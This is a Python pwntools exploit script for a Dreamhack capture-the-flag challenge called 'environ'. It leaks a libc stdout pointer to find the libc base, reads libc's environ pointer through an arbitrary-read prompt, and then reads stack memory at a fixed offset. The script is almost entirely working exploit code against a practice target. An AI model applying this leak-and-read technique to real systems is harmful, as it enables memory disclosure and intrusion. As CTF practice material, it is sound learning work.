#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 11465
HOST = "host1.dreamhack.games"
exe = context.binary = ELF('./environ_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.35.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            brva 0x000000000000143E
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
print("Libc base: " + hex(libc.address))

environ_addr = libc.address + 0x221200
print("Environ address: " + hex(environ_addr))

p.sendlineafter(b'> ', str(1))
# GDB()
p.sendlineafter(b'Addr: ', str(environ_addr))
environ = u64(p.recv(6) + b'\0'*2)
print("Environ: " + hex(environ))

p.sendlineafter(b'> ', str(1))
# GDB()
p.sendlineafter(b'Addr: ', str(environ - 0x1568))

p.interactive()